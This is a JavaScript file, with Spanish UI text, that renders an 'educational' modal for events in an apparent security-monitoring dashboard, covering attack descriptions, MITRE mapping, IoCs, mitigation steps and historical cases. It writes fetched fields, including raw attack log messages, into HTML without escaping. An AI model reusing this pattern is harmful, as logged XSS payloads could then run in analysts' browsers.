        font-size: 0.8rem;
        min-width: auto;
    }
    
    .alert-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
    }
    
    .alert-title {
        display: flex;
        align-items: center;
        gap: 8px;
        font-weight: 600;
    }
    
    .alert-timestamp {
        font-size: 0.8rem;
        color: var(--text-secondary);
    }
    
    .alert-description {
        margin-bottom: 16px;
        color: var(--text-secondary);
        line-height: 1.5;
    }
    
    .alert-actions {
        display: flex;
        gap: 8px;
        justify-content: flex-end;
    }
`;
document.head.appendChild(style);

/**
 * Detalles educativos del modulo  evento
 */
async function showEventEducationalDetails(eventId) {
    console.log(`🔍 Cargando detalles educativos para evento: ${eventId}`);
    console.log(`🌐 URL: ${window.location.origin}/api/events/${eventId}/educational`);

    try {
        showLoadingModal();

        const response = await fetch(`${window.location.origin}/api/events/${eventId}/educational`);
        console.log(`📡 Response status: ${response.status}`);
        
        const result = await response.json();
        console.log(`📦 Response data:`, result);

        if (result.success && result.data) {
            console.log(`✅ Rendering modal con data:`, result.data);
            renderEducationalModal(result.data);
        } else {
            console.error(`❌ API Error: success=${result.success}, data=${result.data}`);
            showErrorModal('No se pudieron cargar los detalles educativos del evento');
        }
    } catch (error) {
        console.error('❌ Error cargando detalles educativos:', error);
        showErrorModal('Error de conexión al cargar detalles del evento');
    } finally {
        hideLoadingModal();
    }
}

/**
 * Renderiza el modal educativo completo
 */
function renderEducationalModal(eventData) {
    console.log(`🎨 Renderizando modal educativo con eventData:`, eventData);
    
    const modalHtml = `
        <div class="educational-modal-overlay" id="educational-modal">
            <div class="educational-modal-container">
                <div class="educational-modal-header">
                    <div class="modal-title-section">
                        <h2 class="modal-title">
                            <span class="event-icon">${getEventTypeIcon(eventData.event.event_type)}</span>
                            Análisis Educativo de Evento de Seguridad
                        </h2>
                        <div class="event-basic-info">
                            <span class="event-id">ID: ${eventData.event.id.substring(0, 8)}...</span>
                            <span class="event-severity severity-${eventData.event.severity.toLowerCase()}">${eventData.event.severity}</span>
                            <span class="event-timestamp">${new Date(eventData.event.timestamp).toLocaleString()}</span>
                        </div>
                    </div>
                    <button class="modal-close-btn" onclick="closeEducationalModal()">✕</button>
                </div>

                <div class="educational-modal-content">
                    <div class="educational-tabs">
                        <div class="tab-buttons">
                            <button class="tab-btn active" data-tab="overview">Resumen</button>
                            <button class="tab-btn" data-tab="educational">Contexto Educativo</button>
                            <button class="tab-btn" data-tab="technical">Análisis Técnico</button>
                            <button class="tab-btn" data-tab="threat-intel">Inteligencia de Amenazas</button>
                            <button class="tab-btn" data-tab="mitigation">Mitigación</button>
                            <button class="tab-btn" data-tab="examples">Casos Reales</button>
                        </div>

                        <div class="tab-content">
                            ${renderOverviewTab(eventData)}
                            ${renderEducationalTab(eventData)}
                            ${renderTechnicalTab(eventData)}
                            ${renderThreatIntelTab(eventData)}
                            ${renderMitigationTab(eventData)}
                            ${renderExamplesTab(eventData)}
                        </div>
                    </div>
                </div>

                <div class="educational-modal-footer">
                    <div class="footer-actions">
                        <button class="btn-secondary" onclick="exportEventReport('${eventData.event.id}')">
                            <span class="btn-icon">📄</span>
                            Exportar Reporte
                        </button>
                        <button class="btn-secondary" onclick="addToThreatHunt('${eventData.event.id}')">
                            <span class="btn-icon">🎯</span>
                            Añadir a Threat Hunt
                        </button>
                        <button class="btn-primary" onclick="closeEducationalModal()">
                            Entendido
                        </button>
                    </div>
                </div>
            </div>
        </div>
    `;

    // Insertar modal en el DOM
    document.body.insertAdjacentHTML('beforeend', modalHtml);
    console.log(`📝 Modal HTML insertado en el DOM`);

    // Configurar eventos de tabs
    setupEducationalModalTabs();
    console.log(`⚙️ Tabs configurados`);

    // Mostrar modal con animación
    requestAnimationFrame(() => {
        const modal = document.getElementById('educational-modal');
        if (modal) {
            modal.classList.add('show');
            console.log(`✨ Modal mostrado con clase 'show'`);
        } else {
            console.error(`❌ No se encontró el modal con ID 'educational-modal'`);
        }
    });
}

/**
 * Renderiza la pestaña de resumen
 */
function renderOverviewTab(eventData) {
    return `
        <div class="tab-panel active" id="overview-panel">
            <div class="overview-grid">
                <div class="overview-card event-summary">
                    <h3>Resumen del Evento</h3>
                    <div class="event-details">
                        <div class="detail-row">
                            <span class="detail-label">Tipo de Ataque:</span>
                            <span class="detail-value">${eventData.educational_context.attack_name}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Fuente:</span>
                            <span class="detail-value">${eventData.event.source}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">IP Origen:</span>
                            <span class="detail-value ip-address">${eventData.event.source_ip || 'Desconocida'}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">País Origen:</span>
                            <span class="detail-value">${eventData.threat_intelligence.origin_country}</span>
                        </div>
                    </div>
                </div>

                <div class="overview-card threat-level">
                    <h3>Nivel de Amenaza</h3>
                    <div class="threat-indicator">
                        <div class="threat-level-badge ${getThreatLevelClass(eventData.threat_intelligence.threat_level)}">
                            ${eventData.threat_intelligence.threat_level}
                        </div>
                        <p class="threat-explanation">
                            ${eventData.educational_context.attack_description}
                        </p>
                    </div>
                </div>

                <div class="overview-card quick-actions">
                    <h3>Acciones Inmediatas Recomendadas</h3>
                    <ul class="quick-actions-list">
                        ${eventData.mitigation_guidance.immediate_actions.slice(0, 3).map(action => `
                            <li class="action-item">
                                <span class="action-priority priority-${action.priority.toLowerCase()}">${action.priority}</span>
                                <span class="action-text">${action.action}</span>
                                <span class="action-timeline">(${action.timeline})</span>
                            </li>
                        `).join('')}
                    </ul>
                </div>

                <div class="overview-card raw-message">
                    <h3>Mensaje Original del Log</h3>
                    <div class="code-block">
                        <pre><code>${eventData.event.raw_message}</code></pre>
                    </div>
                </div>
            </div>
        </div>
    `;
}

/**
 * Renderiza la pestaña educativa
 */
function renderEducationalTab(eventData) {
    return `
        <div class="tab-panel" id="educational-panel">
            <div class="educational-content">
                <div class="education-section">
                    <h3>¿Qué es este tipo de ataque?</h3>
                    <div class="attack-description">
                        <p>${eventData.educational_context.attack_description}</p>
                        <div class="difficulty-badge">
                            Nivel de Dificultad: <span class="difficulty-level">${eventData.educational_context.difficulty_level}</span>
                        </div>
                    </div>
                </div>

                <div class="education-section">
                    <h3>Objetivos de Aprendizaje</h3>
                    <ul class="learning-objectives">
                        ${eventData.educational_context.learning_objectives.map(objective => `
                            <li class="objective-item">
                                <span class="objective-icon">🎯</span>
                                <span class="objective-text">${objective}</span>
                            </li>
                        `).join('')}
                    </ul>
                </div>

                <div class="education-section">
                    <h3>Conceptos Clave</h3>
                    <div class="key-concepts-grid">
                        ${eventData.educational_context.key_concepts.map(concept => `
                            <div class="concept-card">
                                <span class="concept-icon">💡</span>
                                <span class="concept-text">${concept}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div class="education-section mitre-section">
                    <h3>Mapeo MITRE ATT&CK</h3>
                    <div class="mitre-mapping">
                        <div class="mitre-tactics">
                            <h4>Tácticas</h4>
                            <div class="mitre-items">
                                ${eventData.educational_context.mitre_tactics.map(tactic => `
                                    <span class="mitre-tag tactic">${tactic}</span>
                                `).join('')}
                            </div>
                        </div>
                        <div class="mitre-techniques">
                            <h4>Técnicas</h4>
                            <div class="mitre-items">
                                ${eventData.educational_context.mitre_techniques.map(technique => `
                                    <span class="mitre-tag technique">${technique}</span>
                                `).join('')}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

/**
 * Renderiza la pestaña de análisis técnico
 */
function renderTechnicalTab(eventData) {
    return `
        <div class="tab-panel" id="technical-panel">
            <div class="technical-analysis">
                <div class="analysis-section">
                    <h3>Vector de Ataque</h3>
                    <div class="attack-vector-info">
                        <p>${eventData.technical_analysis.attack_vector}</p>
                    </div>
                </div>

                <div class="analysis-section">
                    <h3>Análisis del Payload</h3>
                    <div class="payload-analysis">
                        <div class="payload-explanation">
                            <h4>Explicación del Payload</h4>
                            <p>${eventData.technical_analysis.payload_analysis.payload_explanation}</p>
                        </div>
                        
                        <div class="malicious-indicators">
                            <h4>Indicadores Maliciosos Detectados</h4>
                            <ul class="indicators-list">
                                ${eventData.technical_analysis.payload_analysis.malicious_indicators.map(indicator => `
                                    <li class="indicator-item">
                                        <span class="indicator-icon">🚩</span>
                                        <span class="indicator-text">${indicator}</span>
                                    </li>
                                `).join('')}
                            </ul>
                        </div>

                        ${eventData.technical_analysis.payload_analysis.obfuscation_techniques.length > 0 ? `
                            <div class="obfuscation-techniques">
                                <h4>Técnicas de Ofuscación Detectadas</h4>
                                <div class="techniques-list">
                                    ${eventData.technical_analysis.payload_analysis.obfuscation_techniques.map(technique => `
                                        <span class="technique-badge">${technique}</span>
                                    `).join('')}
                                </div>
                            </div>
                        ` : ''}
                    </div>
                </div>

                ${eventData.technical_analysis.vulnerability_details ? `
                    <div class="analysis-section">
                        <h3>Detalles de la Vulnerabilidad</h3>
                        <div class="vulnerability-info">
                            ${eventData.technical_analysis.vulnerability_details.cve_id ? `
                                <div class="vuln-detail">
                                    <span class="vuln-label">CVE/CWE ID:</span>
                                    <span class="vuln-value cve-id">${eventData.technical_analysis.vulnerability_details.cve_id}</span>
                                </div>
                            ` : ''}
                            ${eventData.technical_analysis.vulnerability_details.cvss_score ? `
                                <div class="vuln-detail">
                                    <span class="vuln-label">CVSS Score:</span>
                                    <span class="vuln-value cvss-score">${eventData.technical_analysis.vulnerability_details.cvss_score}/10</span>
                                </div>
                            ` : ''}
                            <div class="vuln-detail">
                                <span class="vuln-label">Descripción:</span>
                                <span class="vuln-value">${eventData.technical_analysis.vulnerability_details.description}</span>
                            </div>
                            <div class="vuln-detail">
                                <span class="vuln-label">Complejidad de Explotación:</span>
                                <span class="vuln-value">${eventData.technical_analysis.vulnerability_details.exploit_complexity}</span>
                            </div>
                            <div class="vuln-detail">
                                <span class="vuln-label">Componentes Afectados:</span>
                                <ul class="affected-components">
                                    ${eventData.technical_analysis.vulnerability_details.affected_components.map(component => `
                                        <li>${component}</li>
                                    `).join('')}
                                </ul>
                            </div>
                        </div>
                    </div>
                ` : ''}

                <div class="analysis-section">
                    <h3>Indicadores de Compromiso (IoCs)</h3>
                    <div class="iocs-table">
                        <table>
                            <thead>
                                <tr>
                                    <th>Tipo</th>
                                    <th>Valor</th>
                                    <th>Confianza</th>
                                    <th>Descripción</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${eventData.technical_analysis.iocs.map(ioc => `
                                    <tr>
                                        <td><span class="ioc-type">${ioc.ioc_type}</span></td>
                                        <td><code class="ioc-value">${ioc.value}</code></td>
                                        <td><span class="confidence-badge confidence-${ioc.confidence.toLowerCase()}">${ioc.confidence}</span></td>
                                        <td>${ioc.description}</td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    </div>
                </div>

                <div class="analysis-section">
                    <h3>Reglas de Detección Activadas</h3>
                    <div class="detection-rules">
                        ${eventData.technical_analysis.detection_rules.map(rule => `
                            <div class="rule-card">
                                <div class="rule-header">
                                    <span class="rule-name">${rule.rule_name}</span>
                                    <span class="confidence-score">${Math.round(rule.confidence * 100)}% confianza</span>
                                </div>
                                <div class="rule-description">${rule.description}</div>
                                <div class="rule-fp-rate">Tasa de falsos positivos: ${rule.false_positive_rate}</div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        </div>
    `;
}

/**
 * Renderiza la pestaña de inteligencia de amenazas
 */
function renderThreatIntelTab(eventData) {
    return `
        <div class="tab-panel" id="threat-intel-panel">
            <div class="threat-intel-content">
                <div class="intel-section geographic-context">
                    <h3>Contexto Geográfico</h3>
                    <div class="geo-info">
                        <div class="country-info">
                            <div class="country-header">
                                <span class="country-name">${eventData.threat_intelligence.geographic_context.country}</span>
                                <span class="country-code">(${eventData.threat_intelligence.geographic_context.country_code})</span>
                            </div>
                            <div class="risk-assessment">
                                <span class="risk-label">Evaluación de Riesgo:</span>
                                <p class="risk-description">${eventData.threat_intelligence.geographic_context.risk_assessment}</p>
                            </div>
                        </div>
                        
                        <div class="threat-types">
                            <h4>Tipos de Ataques Típicos desde esta Región</h4>
                            <div class="attack-types-grid">
                                ${eventData.threat_intelligence.geographic_context.typical_attack_types.map(type => `
                                    <span class="attack-type-badge">${type}</span>
                                `).join('')}
                            </div>
                        </div>

                        <div class="apt-groups">
                            <h4>Grupos APT Conocidos</h4>
                            <div class="apt-groups-list">
                                ${eventData.threat_intelligence.geographic_context.known_apt_groups.map(group => `
                                    <div class="apt-group-card">
                                        <span class="apt-group-name">${group}</span>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    </div>
                </div>

                <div class="intel-section common-patterns">
                    <h3>Patrones de Ataque Comunes</h3>
                    <div class="patterns-list">
                        ${eventData.threat_intelligence.common_attack_patterns.map(pattern => `
                            <div class="pattern-card">
                                <span class="pattern-icon">🔍</span>
                                <span class="pattern-text">${pattern}</span>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        </div>
    `;
}

/**
 * Renderiza la pestaña de mitigación
 */
function renderMitigationTab(eventData) {
    return `
        <div class="tab-panel" id="mitigation-panel">
            <div class="mitigation-content">
                <div class="mitigation-section immediate">
                    <h3><span class="section-icon">🚨</span> Acciones Inmediatas</h3>
                    <div class="actions-grid">
                        ${eventData.mitigation_guidance.immediate_actions.map(action => `
                            <div class="action-card priority-${action.priority.toLowerCase()}">
                                <div class="action-header">
                                    <span class="action-priority">${action.priority}</span>
                                    <span class="action-timeline">${action.timeline}</span>
                                </div>
                                <div class="action-description">${action.action}</div>
                                <div class="action-tools">
                                    <span class="tools-label">Herramientas necesarias:</span>
                                    <div class="tools-list">
                                        ${action.tools_required.map(tool => `
                                            <span class="tool-badge">${tool}</span>
                                        `).join('')}
                                    </div>
                                </div>
                                <div class="expected-outcome">
                                    <span class="outcome-label">Resultado esperado:</span>
                                    <span class="outcome-text">${action.expected_outcome}</span>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div class="mitigation-section preventive">
                    <h3><span class="section-icon">🛡️</span> Medidas Preventivas</h3>
                    <div class="actions-grid">
                        ${eventData.mitigation_guidance.preventive_measures.map(action => `
                            <div class="action-card">
                                <div class="action-header">
                                    <span class="action-priority">${action.priority}</span>
                                    <span class="action-timeline">${action.timeline}</span>
                                </div>
                                <div class="action-description">${action.action}</div>
                                <div class="action-tools">
                                    <span class="tools-label">Herramientas necesarias:</span>
                                    <div class="tools-list">
                                        ${action.tools_required.map(tool => `
                                            <span class="tool-badge">${tool}</span>
                                        `).join('')}
                                    </div>
                                </div>
                                <div class="expected-outcome">
                                    <span class="outcome-label">Resultado esperado:</span>
                                    <span class="outcome-text">${action.expected_outcome}</span>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>

                <div class="mitigation-section long-term">
                    <h3><span class="section-icon">📈</span> Estrategias a Largo Plazo</h3>
                    <div class="actions-grid">
                        ${eventData.mitigation_guidance.long_term_strategies.map(action => `
                            <div class="action-card">
                                <div class="action-header">
                                    <span class="action-priority">${action.priority}</span>
                                    <span class="action-timeline">${action.timeline}</span>
                                </div>
                                <div class="action-description">${action.action}</div>
                                <div class="action-tools">
                                    <span class="tools-label">Herramientas necesarias:</span>
                                    <div class="tools-list">
                                        ${action.tools_required.map(tool => `
                                            <span class="tool-badge">${tool}</span>
                                        `).join('')}
                                    </div>
                                </div>
                                <div class="expected-outcome">
                                    <span class="outcome-label">Resultado esperado:</span>
                                    <span class="outcome-text">${action.expected_outcome}</span>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        </div>
    `;
}

/**
 * Renderiza la pestaña de ejemplos reales
 */
function renderExamplesTab(eventData) {
    if (!eventData.real_world_examples || eventData.real_world_examples.length === 0) {
        return `
            <div class="tab-panel" id="examples-panel">
                <div class="no-examples">
                    <span class="no-examples-icon">📚</span>
                    <p>No hay ejemplos del mundo real disponibles para este tipo de evento.</p>
                </div>
            </div>
        `;
    }

    return `
        <div class="tab-panel" id="examples-panel">
            <div class="examples-content">
                <div class="examples-intro">
                    <h3>Casos Reales Históricos</h3>
                    <p>Estos son ejemplos reales de incidentes similares que han ocurrido en organizaciones. Estudiar estos casos ayuda a entender el impacto real y las lecciones aprendidas.</p>
                </div>
                
                <div class="examples-grid">
                    ${eventData.real_world_examples.map(example => `
                        <div class="example-card">
                            <div class="example-header">
                                <h4 class="incident-name">${example.incident_name}</h4>
                                <span class="incident-year">${example.year}</span>
                            </div>
                            
                            <div class="example-content">
                                <div class="example-detail">
                                    <span class="detail-label">Organización Afectada:</span>
                                    <span class="detail-value">${example.organization}</span>
                                </div>
                                
                                <div class="example-detail">
                                    <span class="detail-label">Impacto:</span>
                                    <p class="impact-description">${example.impact}</p>
                                </div>
                                
                                <div class="example-detail">
                                    <span class="detail-label">Lecciones Aprendidas:</span>
                                    <p class="lessons-learned">${example.lessons_learned}</p>
                                </div>
                                
                                <div class="example-detail">
                                    <span class="detail-label">Método de Prevención:</span>
                                    <p class="prevention-method">${example.prevention_method}</p>
                                </div>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

/**
 * Configura los eventos de las pestañas del modal educativo
 */
function setupEducationalModalTabs() {
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanels = document.querySelectorAll('.tab-panel');

    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabId = button.getAttribute('data-tab');

            // Remover clase active de todos los botones y paneles
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanels.forEach(panel => panel.classList.remove('active'));

            // Añadir clase active al botón y panel seleccionado
            button.classList.add('active');
            document.getElementById(`${tabId}-panel`).classList.add('active');
        });
    });
}

/**
 * Cierra el modal educativo
 */
function closeEducationalModal() {
    const modal = document.getElementById('educational-modal');
    if (modal) {
        modal.classList.remove('show');
        setTimeout(() => {
            modal.remove();
        }, 300);
    }
}

/**
 * Obtiene el icono correspondiente al tipo de evento
 */
function getEventTypeIcon(eventType) {
    const icons = {
        'SqlInjection': '💉',
        'SQL Injection': '💉',
        'XssAttempt': '🔗',
        'XSS Attack': '🔗',
        'BruteForce': '🔨',
        'Brute Force': '🔨',
        'Anomaly': '📊',
        'SuspiciousActivity': '⚠️',
        'HTTP Request': '🌐',
        'Network Connection': '🔗',
        'Normal': 'ℹ️'
    };
    return icons[eventType] || '🔍';
}

// Helper para formatear el tipo de evento a un texto amigable
function formatEventType(eventType) {
    const typeMap = {
        'SqlInjection': 'SQL Injection',
        'XssAttempt': 'XSS Attempt', 
        'BruteForce': 'Brute Force',
        'Anomaly': 'Anomaly',
        'SuspiciousActivity': 'Suspicious Activity',
        'Normal': 'Normal'
    };
    return typeMap[eventType] || eventType;
}

/**
 * Obtiene la clase CSS para el nivel de amenaza
 */
function getThreatLevelClass(threatLevel) {
    const levelMap = {
        'Muy Alto': 'very-high',
        'Alto': 'high',
        'Medio': 'medium',
        'Bajo': 'low'
    };

    for (const [key, value] of Object.entries(levelMap)) {
        if (threatLevel.includes(key)) {
            return `threat-level-${value}`;
        }
    }
    return 'threat-level-medium';
}

/**
 * Muestra modal de loading
 */
function showLoadingModal() {
    const loadingHtml = `
        <div class="loading-modal-overlay" id="loading-modal">
            <div class="loading-modal-content">
                <div class="loading-spinner"></div>
                <p>Cargando análisis educativo...</p>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', loadingHtml);
}

/**
 * Oculta modal de loading
 */
function hideLoadingModal() {
    const modal = document.getElementById('loading-modal');
    if (modal) {
        modal.remove();
    }
}

/**
 * Muestra modal de error
 */
function showErrorModal(message) {
    const errorHtml = `
        <div class="error-modal-overlay" id="error-modal">
            <div class="error-modal-content">
                <div class="error-icon">⚠️</div>
                <h3>Error</h3>
                <p>${message}</p>
                <button class="btn-primary" onclick="closeErrorModal()">Entendido</button>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', errorHtml);
}

/**
 * Cierra modal de error
 */
function closeErrorModal() {
    const modal = document.getElementById('error-modal');
    if (modal) {
        modal.remove();
    }
}

/**
 * Exporta reporte del evento (placeholder)
 */
function exportEventReport(eventId) {
    console.log(`📄 Exportando reporte para evento: ${eventId}`);
    // TODO: Implementar exportación real
    alert('Funcionalidad de exportación en desarrollo');
}

/**
 * Añade evento a threat hunt (placeholder)
 */
function addToThreatHunt(eventId) {
    console.log(`🎯 Añadiendo evento ${eventId} a threat hunt`);
    // TODO: Implementar añadir a threat hunt
    alert('Funcionalidad de threat hunting en desarrollo');
}